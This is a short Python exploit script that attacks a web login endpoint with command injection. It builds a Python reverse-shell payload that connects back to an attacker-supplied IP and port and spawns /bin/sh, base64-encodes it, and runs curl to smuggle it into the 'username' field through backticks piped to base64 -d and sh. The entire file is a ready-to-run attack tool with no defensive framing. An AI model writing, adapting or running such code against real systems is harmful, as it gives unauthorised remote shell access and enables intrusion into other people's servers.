import sys ,os, base64;

def curl_cmd(our_ip,our_port,target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{our_ip}",{our_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()
	cmd = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(cmd)
	print("Success")

def main():
	liste_ip = None
	liste_port = None
	target_url = None

	if len(sys.argv) != 4:
		print("Err invalid arg")
		return(-1)

	liste_ip = sys.argv[1]
	liste_port = sys.argv[2]
	target_url = sys.argv[3] +"/login"
	print("Exploit "+ str(target_url))
	print(sys.argv[:4])
	curl_cmd(liste_ip, liste_port, target_url)


	

if __name__ == "__main__":
    main()

